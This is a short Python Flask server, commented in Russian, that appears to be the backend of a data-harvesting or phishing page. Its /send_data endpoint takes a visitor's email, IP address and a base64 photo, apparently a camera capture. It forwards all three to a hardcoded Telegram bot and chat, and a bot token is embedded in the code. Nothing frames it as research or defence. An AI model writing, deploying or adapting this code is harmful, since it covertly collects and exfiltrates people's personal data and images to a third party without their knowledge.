from flask import Flask, request
import requests
import base64

app = Flask(__name__)

BOT_TOKEN = '8092191992:AAFbAVEPLZ1XdaQ_XJW8GmZl5fKTQPW0p-Q'
CHAT_ID = '7549799307'

@app.route('/send_data', methods=['POST'])
def send_data():
    data = request.json
    email = data.get('email')
    ip = data.get('ip')
    photo_data = data.get('photo').split(",")[1]

    photo_bytes = base64.b64decode(photo_data)

    # отправка текста
    text = f"📩 Почта: {email}\n🌐 IP: {ip}"
    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                 params={"chat_id": CHAT_ID, "text": text})

    # отправка фото
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                  data={"chat_id": CHAT_ID},
                  files={"photo": ("photo.jpg", photo_bytes)})

    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
